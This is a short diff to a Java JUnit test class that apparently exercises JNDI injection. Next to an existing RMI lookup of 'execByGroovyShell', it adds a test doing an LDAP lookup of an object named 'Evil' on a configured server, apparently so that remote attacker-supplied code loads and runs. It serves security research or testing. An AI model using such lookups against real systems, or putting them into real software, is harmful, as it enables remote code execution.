@@ -28,4 +28,10 @@ public class Test {
         InitialContext ctx = new InitialContext();
         ctx.lookup(Constants.rmiUrl + "execByGroovyShell");
     }
+
+    @org.junit.Test
+    public void testLDAP() throws NamingException {
+        InitialContext ctx = new InitialContext();
+        ctx.lookup(Constants.ldapUrl+"Evil");
+    }
 }
